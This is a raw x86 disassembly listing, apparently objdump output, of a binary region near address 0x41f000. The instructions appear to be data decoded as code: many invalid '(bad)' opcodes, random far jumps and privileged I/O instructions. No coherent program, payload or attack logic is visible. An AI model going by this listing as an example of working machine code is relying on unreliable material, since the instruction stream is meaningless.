  41ecce:	sub    esi,DWORD PTR [edx+0x7b]
  41ecd1:	aam    0x28
  41ecd3:	adc    dh,ah
  41ecd5:	jle    0x41ecd4
  41ecd7:	aam    0x4
  41ecd9:	loop   0x41ecab
  41ecdb:	addr16 iret 
  41ecdd:	pop    ds
  41ecde:	pop    ebp
  41ecdf:	popa   
  41ece0:	mov    cl,0xec
  41ece2:	(bad)  
  41ece3:	jae    0x41ecf5
  41ece5:	jae    0x41ed39
  41ece7:	jle    0x41ec8f
  41ece9:	pop    ss
  41ecea:	out    dx,al
  41eceb:	hlt    
  41ecec:	sub    DWORD PTR [ecx+0x0],ebx
	...
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0x24015fd0
  41ed64:	sbb    al,0x2b
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	call   0xcc17fbc4
  41ed73:	sub    BYTE PTR [ebp-0x488be9a0],cl
  41ed79:	lds    eax,FWORD PTR [esi+0x53b4ea9d]
  41ed7f:	bound  ebp,QWORD PTR [edi+0x143b5bb8]
  41ed85:	outs   dx,BYTE PTR ds:[esi]
  41ed86:	je     0x41ed30
  41ed88:	icebp  
  41ed89:	xchg   DWORD PTR [ebx],ebx
  41ed8b:	mov    edx,0x2dca9094
  41ed90:	bound  ebx,QWORD PTR [edx+0x7374e8bf]
  41ed96:	push   cs
  41ed97:	das    
  41ed98:	pop    eax
  41ed99:	gs ins BYTE PTR es:[edi],dx
  41ed9b:	cwde   
  41ed9c:	fstp   DWORD PTR [esi-0x2fd3c627]
  41eda2:	int3   
  41eda3:	aam    0xd1
  41eda5:	in     eax,dx
  41eda6:	jno    0x41edd4
  41eda8:	dec    edi
  41eda9:	fs sbb dl,cl
  41edac:	mov    ch,0x5d
  41edae:	call   0xd691:0x29e408b2
  41edb5:	sti    
  41edb6:	xlat   BYTE PTR ds:[ebx]
  41edb7:	mov    dl,0x4
  41edb9:	dec    esi
  41edba:	pop    esi
  41edbb:	std    
  41edbc:	cli    
  41edbd:	cwde   
  41edbe:	fwait
  41edbf:	and    dh,BYTE PTR [ecx+edi*8-0x4]
  41edc3:	adc    ebx,DWORD PTR ds:0x8f822ba9
  41edc9:	adc    eax,0x44ef0272
  41edce:	xor    eax,0xed9ae01d
  41edd3:	inc    edx
  41edd4:	add    edx,DWORD PTR [eax]
  41edd6:	xchg   eax,ebp
  41edd8:	repnz stos DWORD PTR es:[edi],eax
  41edda:	add    bl,al
  41eddc:	mov    dl,0x91
  41edde:	adc    ebx,DWORD PTR [eax]
  41ede0:	mov    eax,0x9eccac2f
  41ede5:	fadd   DWORD PTR [esi-0x69821438]
  41edeb:	in     al,dx
  41edec:	add    esi,DWORD PTR [ecx]
  41edee:	push   0xffffffcf
  41edf0:	or     edx,edx
  41edf2:	outs   dx,DWORD PTR ds:[esi]
  41edf3:	aam    0xd8
  41edf5:	cmp    al,0xd8
  41edf7:	or     eax,0x116bf0ab
  41edfc:	repz jne 0x41eda8
  41edff:	mov    ebp,?
  41ee01:	into   
  41ee02:	jo     0x41ede8
  41ee04:	mov    DWORD PTR ds:0x8e7547c3,esi
  41ee0a:	stc    
  41ee0b:	xor    edi,ecx
  41ee0d:	inc    esp
  41ee0e:	push   ebp
  41ee0f:	xchg   BYTE PTR [edx],bl
  41ee11:	out    dx,al
  41ee12:	push   edx
  41ee13:	xchg   edx,eax
  41ee14:	and    ch,bl
  41ee16:	bnd call 0xd1b3380
  41ee1c:	stc    
  41ee1d:	sbb    BYTE PTR [ebp-0x66],bl
  41ee20:	push   cs
  41ee21:	loopne 0x41ee08
  41ee23:	les    edi,FWORD PTR [edx-0x2e]
  41ee26:	fst    DWORD PTR [ecx+0x1b70f3]
  41ee2c:	xchg   edi,eax
  41ee2d:	scas   al,BYTE PTR es:[edi]
  41ee2e:	addr16 ret 
  41ee30:	ret    0x5201
  41ee33:	out    dx,al
  41ee34:	hlt    
  41ee35:	xlat   BYTE PTR ds:[ebx]
  41ee36:	iret   
  41ee37:	bound  esi,QWORD PTR ds:0x411bf6f5
  41ee3d:	push   es
  41ee3e:	stc    
  41ee3f:	pusha  
  41ee40:	lds    ecx,FWORD PTR [edi+eiz*4]
  41ee43:	push   ebx
  41ee44:	je     0x41edd2
  41ee46:	icebp  
  41ee47:	and    DWORD PTR [esi-0x74ff0c26],esp
  41ee4d:	(bad)  
  41ee4e:	jg     0x41ee66
  41ee50:	add    ch,BYTE PTR [ecx+0xa]
  41ee53:	outs   dx,BYTE PTR ds:[esi]
  41ee54:	push   ecx
  41ee55:	cmp    al,0x4f
  41ee57:	push   ecx
  41ee58:	adc    DWORD PTR ds:0xa9e940ea,esi
  41ee5e:	push   ebp
  41ee5f:	cs popf 
  41ee61:	dec    edi
  41ee62:	inc    ebp
  41ee63:	stc    
  41ee64:	scas   eax,DWORD PTR es:[edi]
  41ee65:	clc    
  41ee66:	inc    ecx
  41ee67:	rol    BYTE PTR [eax+0x59],0x2b
  41ee6b:	mov    ch,0x57
  41ee6d:	sbb    DWORD PTR [eax],eax
	...
  41eed3:	add    BYTE PTR [eax],al
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x6784:0x283e29e7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	xchg   bh,dh
  41eef0:	cmp    al,0xb8
  41eef2:	in     eax,0x8b
  41eef4:	sar    esi,cl
  41eef6:	jg     0x41eedd
  41eef8:	dec    ebx
  41eef9:	popf   
  41eefa:	je     0x41ef5e
  41eefc:	shl    ecx,cl
  41eefe:	cmp    bh,ah
  41ef00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef01:	adc    DWORD PTR [ecx],ebx
  41ef03:	(bad)  
  41ef05:	sbb    bl,bl
  41ef07:	inc    ebp
  41ef08:	inc    edi
  41ef09:	mov    esi,0x7b8648da
  41ef0e:	dec    esp
  41ef0f:	dec    ecx
  41ef10:	int    0x4f
  41ef12:	addr16 dec eax
  41ef14:	shr    BYTE PTR [ebp-0x69],cl
  41ef17:	mov    esp,0x48e503a5
  41ef1c:	je     0x41ef8b
  41ef1e:	(bad)  
  41ef1f:	retf   0x9e5d
  41ef22:	adc    BYTE PTR [esp+esi*4],dl
  41ef25:	jns    0x41ef36
  41ef27:	add    eax,0x5d4fc5df
  41ef2c:	out    dx,al
  41ef2d:	xchg   esp,eax
  41ef2e:	dec    edi
  41ef2f:	add    bl,bh
  41ef31:	fwait
  41ef32:	mul    DWORD PTR [ebx+esi*1]
  41ef35:	scas   al,BYTE PTR es:[edi]
  41ef36:	cmp    edi,0x3b
  41ef39:	adc    al,0xf0
  41ef3b:	push   esi
  41ef3c:	jne    0x41efac
  41ef3e:	ror    BYTE PTR [ebp+0x6c748d47],0xbc
  41ef45:	adc    eax,0xd94938da
  41ef4a:	loop   0x41ef26
  41ef4c:	or     bh,BYTE PTR [eax+0x67]
  41ef4f:	or     DWORD PTR [eax-0x70],ecx
  41ef52:	imul   edx,ecx,0xa84eb93c
  41ef58:	and    al,0x8
  41ef5a:	addr16 and eax,0x6921770a
  41ef60:	xchg   ecx,eax
  41ef61:	xor    dh,BYTE PTR [ebx+0x3c4b5f23]
  41ef67:	inc    esp
  41ef68:	dec    ecx
  41ef69:	sbb    eax,0xcc5f0c9
  41ef6e:	fcom   QWORD PTR [ebx]
  41ef70:	jg     0x41efca
  41ef72:	sbb    ecx,DWORD PTR [ecx+esi*4+0x73]
  41ef76:	jae    0x41ef08
  41ef78:	xor    eax,0x129a1288
  41ef7d:	out    0xfd,eax
  41ef7f:	stos   BYTE PTR es:[edi],al
  41ef80:	mov    dl,0xf5
  41ef82:	cmp    dh,al
  41ef84:	inc    BYTE PTR [esi+esi*8]
  41ef87:	stc    
  41ef88:	push   ss
  41ef89:	shr    DWORD PTR ds:0xe0314c8a,1
  41ef8f:	hlt    
  41ef90:	test   BYTE PTR [ecx+esi*4+0x46b28daf],ah
  41ef97:	in     eax,0x6f
  41ef99:	sbb    DWORD PTR [eax],ebx
  41ef9b:	adc    ebp,DWORD PTR [esi-0x3a6dd492]
  41efa1:	or     BYTE PTR [esi-0x2e],0x2a
  41efa5:	fstp   TBYTE PTR [ebx-0xb2f1a8f]
  41efab:	fdiv   st,st(0)
  41efad:	fild   WORD PTR [esi-0x2]
  41efb0:	push   ecx
  41efb1:	dec    ebp
  41efb2:	mov    dh,0x39
  41efb4:	or     eax,0xecae9849
  41efb9:	and    al,0x52
  41efbb:	scas   al,BYTE PTR es:[edi]
  41efbc:	gs adc eax,0x4ee276ab
  41efc2:	mov    cl,0x2a
  41efc4:	push   ebx
  41efc5:	mov    ecx,0x3fa13704
  41efca:	repnz fmul DWORD PTR es:[esi]
  41efce:	sub    DWORD PTR [esi+0x2a0e45f1],esp
  41efd4:	mov    bl,0x43
  41efd6:	sar    DWORD PTR [ecx-0x2b],1
  41efd9:	push   ds
  41efda:	sub    eax,0x76af46a1
  41efdf:	repnz sahf 
  41efe1:	sbb    DWORD PTR [ecx+0x2a937d4e],eax
  41efe7:	inc    edi
  41efe8:	or     al,0x97
  41efea:	mov    edx,0x4adadd
	...
  41f053:	add    BYTE PTR [eax],al
  41f055:	add    BYTE PTR [ecx-0xda40a3],bh
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul esp,DWORD PTR [ecx],0xffffffcb
  41f064:	loopne 0x41f087
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	mov    al,fs:0x3dff07a8
  41f074:	ja     0x41f060
  41f076:	xor    DWORD PTR [ebx+edi*2-0x1aacfe08],esi
  41f07d:	pop    ebp
  41f07e:	(bad)  
  41f07f:	mul    BYTE PTR [ecx-0x557e9ee8]
  41f085:	mov    esp,cs
  41f087:	in     al,0x2d
  41f089:	int    0x25
  41f08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f08c:	cmp    DWORD PTR [ebx+0x61],esi
  41f08f:	or     BYTE PTR [eax-0x56],ah
  41f092:	sbb    ecx,DWORD PTR [edx]
  41f094:	add    al,0xb1
  41f096:	xchg   ecx,eax
  41f097:	jle    0x41f0a3
  41f099:	push   eax
  41f09a:	sar    DWORD PTR ds:0x5fe19cd3,1
  41f0a0:	dec    edi
  41f0a1:	adc    eax,eax
  41f0a3:	mov    eax,ds:0x8b1b1301
  41f0a8:	add    ecx,DWORD PTR [eax-0x279217fa]
  41f0ae:	fnstcw WORD PTR [edx-0x60]
  41f0b1:	jle    0x41f0cf
  41f0b3:	cwde   
  41f0b4:	fldz   
  41f0b6:	nop
  41f0b7:	in     al,dx
  41f0b8:	adc    al,0x3a
  41f0ba:	mov    cl,0x58
  41f0bc:	bnd js 0x41f0c2
  41f0bf:	aas    
  41f0c0:	mov    DWORD PTR [edi],edx
  41f0c2:	loope  0x41f0f4
  41f0c4:	sti    
  41f0c5:	rol    DWORD PTR [edx-0x1ebe98a3],0x79
  41f0cc:	pop    ebx
  41f0cd:	mov    ah,0x74
  41f0cf:	jp     0x41f09b
  41f0d1:	cmp    al,0xbd
  41f0d3:	mov    ds:0x1cb33d6c,ax
  41f0d9:	in     al,dx
  41f0da:	or     eax,0xf21dc458
  41f0df:	(bad)  
  41f0e1:	and    DWORD PTR [ebx],0xffffffc2
  41f0e4:	pushf  
  41f0e5:	pushf  
  41f0e6:	(bad)  
  41f0e7:	mov    ch,0x55
  41f0e9:	mov    BYTE PTR [esi+eax*4+0x7f],al
  41f0ed:	dec    ecx
  41f0ee:	sahf   
  41f0ef:	int    0x2b
  41f0f1:	jle    0x41f13a
  41f0f3:	fcomp  DWORD PTR gs:[edx]
  41f0f6:	int3   
  41f0f7:	mov    ah,0x84
  41f0f9:	invd   
  41f0fb:	inc    eax
  41f0fc:	xchg   esp,eax
  41f0fd:	mov    ebx,0x25138477
  41f102:	or     bl,BYTE PTR [edx+0x3fd5b8c6]
  41f108:	fldenv [esi+0x3df7035e]
  41f10e:	ud1    edx,edi
  41f111:	mov    ecx,0x46cd794e
  41f116:	inc    ecx
  41f117:	mov    dh,0xc6
  41f119:	xlat   BYTE PTR ds:[ebx]
  41f11a:	push   es
  41f11b:	fnstsw WORD PTR [esi]
  41f11d:	dec    edx
  41f11e:	mov    al,0xc6
  41f120:	loope  0x41f0b2
  41f122:	shr    BYTE PTR [esi],1
  41f124:	push   ebx
  41f125:	jns    0x41f1a4
  41f127:	dec    eax
  41f128:	jo     0x41f119
  41f12a:	lea    esp,[edx]
  41f12c:	jp     0x41f146
  41f12e:	pop    esi
  41f12f:	mov    edi,0xdff43491
  41f134:	rcl    BYTE PTR [ebp+0x1b772f23],1
  41f13a:	test   al,0xd9
  41f13c:	xor    al,0xaf
  41f13f:	in     al,0x14
  41f141:	adc    al,0xc7
  41f143:	mov    ch,0xe2
  41f145:	shl    ebx,cl
  41f147:	pop    edx
  41f148:	add    al,0xb1
  41f14a:	push   0xd33b42dd
  41f14f:	dec    ecx
  41f150:	ins    BYTE PTR es:[edi],dx
  41f151:	push   esi
  41f152:	sbb    al,0x40
  41f154:	jne    0x41f178
  41f156:	mov    ecx,0xe15f6b3c
  41f15b:	and    BYTE PTR [ecx+0x7c9fb8a5],ah
  41f161:	xchg   ebx,eax
  41f162:	dec    edi
  41f163:	les    edx,FWORD PTR [edx-0x129f6276]
  41f169:	add    bl,BYTE PTR [ebp+ebp*2+0x1cb3]
	...
  41f1d4:	add    BYTE PTR [eax],al
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xabb63539
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	icebp  
  41f1ef:	mov    esi,0xcad26003
  41f1f4:	jl     0x41f22a
  41f1f6:	out    0xa9,eax
  41f1f8:	int3   
  41f1f9:	mov    edi,0xadd0c610
  41f1fe:	mov    eax,0xd30bd414
  41f203:	int    0x2b
  41f205:	mov    bl,0x7e
  41f207:	ja     0x41f1c4
  41f209:	sti    
  41f20a:	into   
  41f20b:	and    dh,BYTE PTR [edi+0x17]
  41f20e:	push   esp
  41f20f:	mov    dl,0x9b
  41f211:	pusha  
  41f212:	out    dx,al
  41f213:	push   0xa688072c
  41f218:	test   eax,0x113101d8
  41f21d:	js     0x41f290
  41f21f:	ins    BYTE PTR es:[edi],dx
  41f220:	and    BYTE PTR [edi+0x47],0xc0
  41f224:	xor    edx,DWORD PTR [esp+ebp*8-0x422ecdff]
  41f22b:	mov    dh,0xc7
  41f22d:	jp     0x41f2aa
  41f22f:	inc    esi
  41f230:	xor    edi,eax
  41f232:	sar    DWORD PTR [eax-0x40596c96],cl
  41f238:	cmp    al,0x15
  41f23a:	lahf   
  41f23b:	mov    ss,WORD PTR [edx+0x79]
  41f23e:	ja     0x41f212
  41f240:	cld    
  41f241:	inc    edx
  41f242:	aas    
  41f243:	mov    ds:0xdff52e19,eax
  41f248:	popa   
  41f249:	js     0x41f273
  41f24b:	rol    DWORD PTR [eax],1
  41f24d:	faddp  st(2),st
  41f24f:	pop    ss
  41f250:	mov    eax,ds:0xad6252e5
  41f255:	ror    DWORD PTR [ecx],0xe3
  41f258:	clc    
  41f259:	(bad)  
  41f25a:	out    dx,al
  41f25b:	jl     0x41f1e8
  41f25d:	imul   esp,DWORD PTR [edx+0x40a6791a],0x46ee861
  41f267:	jg     0x41f27c
  41f269:	ret    
  41f26a:	jmp    0x59b5:0xbe9118cc
  41f271:	push   ds
  41f272:	stc    
  41f273:	icebp  
  41f274:	xlat   BYTE PTR ds:[ebx]
  41f275:	xchg   ebp,eax
  41f276:	or     DWORD PTR [ecx+ebx*4],ebx
  41f279:	aam    0x43
  41f27b:	das    
  41f27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f27d:	pop    edi
  41f27e:	loope  0x41f203
  41f280:	pop    ecx
  41f281:	sbb    dl,BYTE PTR [esi-0x1b99751c]
  41f287:	jo     0x41f2c6
  41f289:	jge    0x41f25a
  41f28b:	pop    ss
  41f28c:	hlt    
  41f28d:	jp     0x41f2ed
  41f28f:	dec    edx
  41f290:	push   ebp
  41f291:	push   eax
  41f292:	fimul  DWORD PTR [ebx-0x4b]
  41f295:	pusha  
  41f296:	dec    esp
  41f297:	daa    
  41f298:	test   eax,0x9d1ef10f
  41f29d:	aas    
  41f29e:	clc    
  41f29f:	inc    edi
  41f2a0:	inc    eax
  41f2a1:	or     DWORD PTR [edx-0x6c9b527c],ebx
  41f2a7:	jecxz  0x41f2b4
  41f2a9:	sahf   
  41f2aa:	mov    ebp,0x94e683e1
  41f2af:	adc    DWORD PTR [edi+0x69],eax
  41f2b2:	fst    st(7)
  41f2b4:	imul   DWORD PTR [edx+edx*8]
  41f2b7:	les    ebx,FWORD PTR [ebx+0x20]
  41f2ba:	pop    ds
  41f2bb:	xchg   esp,eax
  41f2bc:	test   al,0xf8
  41f2be:	pop    esp
  41f2bf:	sbb    DWORD PTR [esi-0x3e789bff],eax
  41f2c5:	and    dh,BYTE PTR [eax+0x48d696b0]
  41f2cb:	cmp    eax,0x3ce528d
  41f2d0:	les    edi,FWORD PTR [ecx-0xd58f568]
  41f2d6:	cmp    BYTE PTR [esi+0x34],ah
  41f2d9:	jno    0x41f332
  41f2db:	(bad)  
  41f2dc:	bound  eax,QWORD PTR [eax+edi*4+0x71933faa]
  41f2e3:	enter  0x8998,0xa6
  41f2e7:	push   cs
  41f2e8:	repz (bad) 
  41f2ea:	test   DWORD PTR [ecx],esp
  41f2ec:	sub    DWORD PTR [esi],0x0
	...
  41f353:	add    BYTE PTR [eax],al
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f3a0
  41f363:	push   ss
  41f364:	pop    ebx
  41f365:	(bad)  
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	aam    0x3f
  41f370:	ror    DWORD PTR [ebx+0x5f],0x1f
  41f374:	mov    eax,ds:0x2e4b1d61
  41f379:	push   ebx
  41f37a:	lods   eax,DWORD PTR ds:[esi]
  41f37b:	and    DWORD PTR [edx+ecx*1],esp
  41f37e:	pop    es
  41f37f:	mov    al,BYTE PTR [ecx+eiz*4]
  41f382:	ret    0x5fdc
  41f385:	sbb    eax,0x3b53ada4
  41f38a:	xchg   ebx,eax
  41f38b:	add    al,0x40
  41f38d:	mov    ?,WORD PTR [eax]
  41f38f:	out    0xf7,eax
  41f391:	or     eax,0x131fb20d
  41f397:	pop    ecx
  41f398:	cmp    esi,DWORD PTR [esi-0x2f519ab9]
  41f39e:	xor    al,0x53
  41f3a0:	lods   eax,DWORD PTR ds:[esi]
  41f3a1:	xor    al,ah
  41f3a3:	mov    ah,cl
  41f3a5:	adc    edi,DWORD PTR [eax-0x4d08ebea]
  41f3ab:	cmp    al,ch
  41f3ad:	inc    edx
  41f3ae:	inc    ebp
  41f3af:	add    DWORD PTR [edx-0x2dee76d],edx
  41f3b5:	stc    
  41f3b6:	or     al,0xad
  41f3b8:	sar    BYTE PTR [edx+0x553251c],cl
  41f3be:	adc    ah,BYTE PTR [ecx-0x10]
  41f3c1:	test   eax,0x7105202e
  41f3c6:	test   DWORD PTR [edx-0x39718ba5],eax
  41f3cc:	out    0x6d,eax
  41f3ce:	loopne 0x41f3c0
  41f3d0:	push   esp
  41f3d1:	pop    ebx
  41f3d2:	and    dl,ah
  41f3d4:	mov    cl,0x9
  41f3d6:	push   edi
  41f3d7:	fmul   DWORD PTR [ebp+0x10]
  41f3da:	jle    0x41f41e
  41f3dc:	mov    WORD PTR [ebp+0x4d],ds
  41f3df:	clc    
  41f3e0:	ins    DWORD PTR es:[edi],dx
  41f3e1:	loope  0x41f3fb
  41f3e3:	fisttp QWORD PTR [eax+0x1ef6ace7]
  41f3e9:	adc    DWORD PTR [eax+0x6783d176],eax
  41f3ef:	push   ebp
  41f3f0:	mov    dh,0x5d
  41f3f2:	cmp    al,0x3f
  41f3f4:	ins    BYTE PTR es:[edi],dx
  41f3f5:	in     al,0xe0
  41f3f7:	push   ebp
  41f3f8:	sbb    eax,0x83f385e3
  41f3fd:	mov    ch,bh
  41f3ff:	pop    edx
  41f400:	jo     0x41f394
  41f402:	push   ebp
  41f403:	cmp    cl,BYTE PTR [ebx+0xde69ccc]
  41f409:	and    BYTE PTR [esp+edx*4],dl
  41f40c:	cmp    edi,eax
  41f40e:	clc    
  41f40f:	mov    ecx,0xd06f9359
  41f414:	popa   
  41f415:	ja     0x41f44a
  41f417:	sub    eax,0xc8ed9c8e
  41f41c:	push   0x39
  41f41e:	mov    ebx,0x648ab8ac
  41f423:	icebp  
  41f424:	and    al,0x23
  41f426:	stos   BYTE PTR es:[edi],al
  41f427:	adc    DWORD PTR [eax+0xc0fa23d],edi
  41f42d:	fimul  WORD PTR [ecx]
  41f42f:	inc    esi
  41f430:	jecxz  0x41f411
  41f432:	sbb    WORD PTR [ebx],bx
  41f435:	xchg   BYTE PTR [ecx-0x57b781ba],dl
  41f43b:	jecxz  0x41f424
  41f43d:	mov    ebp,0x7c42f8d
  41f442:	jb     0x41f419
  41f444:	lahf   
  41f445:	xor    ebp,DWORD PTR [esi+0x2]
  41f448:	leave  
  41f449:	int3   
  41f44a:	xchg   esp,ebx
  41f44c:	cs out dx,al
  41f44e:	xor    eax,0xa991cb72
  41f453:	add    DWORD PTR [edi+0x5a],ebx
  41f456:	test   DWORD PTR ds:[edi-0x461f8f52],ecx
  41f45d:	xchg   ebx,eax
  41f45e:	outs   dx,BYTE PTR ds:[esi]
  41f45f:	inc    ebx
  41f460:	dec    edi
  41f461:	jl     0x41f4d1
  41f463:	mov    ds:0xeda0f432,al
  41f468:	imul   bh
  41f46a:	or     eax,0xc6f8d2
	...
  41f4d3:	add    BYTE PTR [eax],al
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xa1
  41f4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e4:	mov    dl,bl
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	cdq    
  41f4ef:	xor    al,bh
  41f4f1:	push   cs
  41f4f2:	dec    ebp
  41f4f3:	jmp    0x62a6:0x81f15098
  41f4fa:	(bad)  
  41f4fb:	or     DWORD PTR [ebx],edi
  41f4fd:	loop   0x41f4f9
  41f4ff:	es dec ecx
  41f501:	rcr    BYTE PTR [ebx+edi*4-0x13],1
  41f505:	mov    ecx,0xffdea001
  41f50a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f50b:	shl    BYTE PTR [esp],0xa
  41f50f:	xchg   edx,eax
  41f510:	dec    esi
  41f511:	sub    eax,DWORD PTR [ebx]
  41f513:	and    BYTE PTR [ebp+ecx*2+0x3f65ce22],ah
  41f51a:	ss retf 0x3d9
  41f51e:	fcmove st,st(6)
  41f520:	mov    dh,0xd8
  41f522:	inc    eax
  41f523:	pop    eax
  41f524:	mov    ds:0xea5599b5,al
  41f529:	sti    
  41f52a:	imul   ecx,DWORD PTR [ebx-0x3b],0xffffffb3
  41f52e:	clc    
  41f52f:	lds    eax,FWORD PTR [ebp+0x57e8c9ef]
  41f535:	push   0xffffffe5
  41f537:	cdq    
  41f538:	fmul   QWORD PTR [edx]
  41f53a:	dec    ebp
  41f53b:	cmp    DWORD PTR [esi+ecx*4],eax
  41f53e:	push   0x7417bd33
  41f543:	out    0x89,al
  41f545:	and    eax,0xde8b9eca
  41f54a:	jp     0x41f5bc
  41f54c:	add    ecx,ebx
  41f54e:	cmp    eax,edx
  41f550:	fcmovnbe st,st(4)
  41f552:	fs xor edi,ecx
  41f555:	dec    ebp
  41f556:	enter  0xef9e,0x40
  41f55a:	loop   0x41f5a5
  41f55c:	fdivr  DWORD PTR [edi-0x472d104f]
  41f562:	dec    edx
  41f563:	push   edx
  41f564:	dec    esp
  41f565:	js     0x41f527
  41f567:	sub    BYTE PTR [edi-0x61],ch
  41f56a:	mov    ch,0x1
  41f56c:	imul   ecx,DWORD PTR [ebx],0xffffff83
  41f56f:	pop    edx
  41f570:	jmp    0x9ac2:0x81dcb4c1
  41f577:	addr16 lock jle 0x41f57f
  41f57b:	je     0x41f53f
  41f57d:	mov    ebp,0xda35c6ea
  41f582:	ins    DWORD PTR es:[edi],dx
  41f583:	push   ebp
  41f584:	(bad)  
  41f585:	lahf   
  41f586:	pop    esp
  41f587:	enter  0xce00,0xfa
  41f58b:	mov    edx,0xad581136
  41f590:	(bad)
  41f593:	repnz fild QWORD PTR [ecx]
  41f596:	retf   
  41f597:	mov    eax,0x57f873b9
  41f59c:	jge    0x41f5af
  41f59e:	into   
  41f59f:	nop
  41f5a0:	mov    ch,0x11
  41f5a2:	test   eax,0xed6b38eb
  41f5a7:	scas   eax,DWORD PTR es:[edi]
  41f5a8:	mov    eax,DWORD PTR [esi+eiz*2]
  41f5ab:	imul   edi,DWORD PTR [ebx-0x20],0xffffffb9
  41f5af:	sbb    DWORD PTR [edi],esp
  41f5b1:	pop    ebp
  41f5b2:	loop   0x41f5cf
  41f5b4:	pop    ebx
  41f5b5:	fadd   QWORD PTR [ebx-0x58]
  41f5b8:	xor    BYTE PTR [esi-0x78],cl
  41f5bb:	mov    edi,0x3d69f404
  41f5c0:	dec    esp
  41f5c1:	mov    ds:0x494ddb5a,eax
  41f5c6:	xor    DWORD PTR [edx+0x6705a429],0x73a92401
  41f5d0:	push   0xe1186d45
  41f5d5:	mov    ch,0x4f
  41f5d7:	enter  0x5a76,0x5d
  41f5db:	cmp    esi,DWORD PTR ss:[eax]
  41f5de:	and    cl,ch
  41f5e0:	or     ebp,esp
  41f5e2:	pop    esi
  41f5e3:	add    ch,BYTE PTR [ebp+0x15]
  41f5e6:	stos   BYTE PTR es:[edi],al
  41f5e7:	sub    BYTE PTR [edx],ah
  41f5e9:	xor    bh,BYTE PTR [edi]
  41f5eb:	shr    edx,1
  41f5ed:	push   edx
	...
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x630e:0xea03d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	leave  
  41f66f:	xor    bl,0xf4
  41f672:	xor    esi,DWORD PTR [ebx*2+0x227c14ce]
  41f679:	loop   0x41f62f
  41f67b:	jnp    0x41f613
  41f67d:	sahf   
  41f67e:	lods   eax,DWORD PTR ds:[esi]
  41f67f:	sbb    eax,0x8c5d95f1
  41f684:	and    eax,0x9295ca4a
  41f689:	lods   eax,DWORD PTR ds:[esi]
  41f68a:	jg     0x41f651
  41f68c:	or     ebx,DWORD PTR ds:0xcb4aca1
  41f692:	dec    ecx
  41f693:	jp     0x41f67b
  41f695:	jae    0x41f683
  41f697:	xor    ecx,DWORD PTR [ebp-0x457967e2]
  41f69d:	imul   ecx,DWORD PTR [ebx],0xa404fc03
  41f6a3:	dec    esi
  41f6a4:	mov    ch,0x42
  41f6a6:	rol    esp,cl
  41f6a8:	(bad)  
  41f6a9:	jle    0x41f6b3
  41f6ab:	push   ds
  41f6ac:	in     al,dx
  41f6ad:	mov    bl,0xe8
  41f6af:	xor    edi,DWORD PTR ds:0xb4a66e27
  41f6b5:	dec    edx
  41f6b6:	mov    es,WORD PTR [ecx+0x75]
  41f6b9:	sub    al,0xde
  41f6bb:	mov    al,0xde
  41f6bd:	mov    ?,WORD PTR ds:0xb2a19f71
  41f6c3:	adc    eax,0x7b2172c6
  41f6c8:	cmp    edx,DWORD PTR [eax+0x5e]
  41f6cb:	inc    esi
  41f6cc:	push   ebp
  41f6cd:	fldenv [esp+edx*2+0x48d2ac98]
  41f6d4:	push   edx
  41f6d5:	fld    TBYTE PTR [ecx]
  41f6d7:	shr    cl,0x1b
  41f6da:	mov    ah,0xea
  41f6dc:	cmp    ch,BYTE PTR [esi]
  41f6de:	inc    esi
  41f6df:	aad    0x58
  41f6e1:	or     bh,dh
  41f6e3:	mov    cl,0xaa
  41f6e5:	jle    0x41f683
  41f6e7:	mov    gs,WORD PTR [esi]
  41f6e9:	mov    dh,0x43
  41f6eb:	ret    
  41f6ec:	imul   ecx,DWORD PTR [edi+0x2a63aaeb],0xd515d4a5
  41f6f6:	and    ch,cl
  41f6f8:	daa    
  41f6f9:	inc    eax
  41f6fa:	repnz out dx,eax
  41f6fc:	aas    
  41f6fd:	jge    0x41f6f7
  41f6ff:	jne    0x41f6f7
